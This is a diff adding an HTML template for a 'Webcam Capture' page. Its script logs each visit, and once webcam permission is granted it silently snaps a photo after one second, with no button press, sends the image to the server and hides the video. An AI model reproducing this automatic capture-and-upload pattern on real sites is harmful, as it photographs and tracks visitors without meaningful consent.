@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Webcam Capture</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="container">
+        <h1>Webcam Capture Page</h1>
+        <video id="video" width="640" height="480" autoplay></video>
+        <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+        <div class="button-container">
+            <a href="{{ url_for('index') }}" class="button">Back to Home</a>
+        </div>
+    </div>
+
+    <script>
+        // Record page visit
+        fetch(`/record_visit?page=${window.location.pathname}`);
+
+        // Webcam handling
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                // Take picture after a short delay
+                setTimeout(() => {
+                    context.drawImage(video, 0, 0, 640, 480);
+                    const imageData = canvas.toDataURL('image/jpeg');
+                    
+                    // Send the capture to server
+                    fetch('/save_capture', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ image_data: imageData })
+                    });
+
+                    // Stop the video stream
+                    stream.getTracks().forEach(track => track.stop());
+                    video.style.display = 'none';
+                }, 1000);
+            })
+            .catch(err => {
+                console.log("Error accessing webcam:", err);
+                video.style.display = 'none';
+            });
+    </script>
+</body>
+</html>
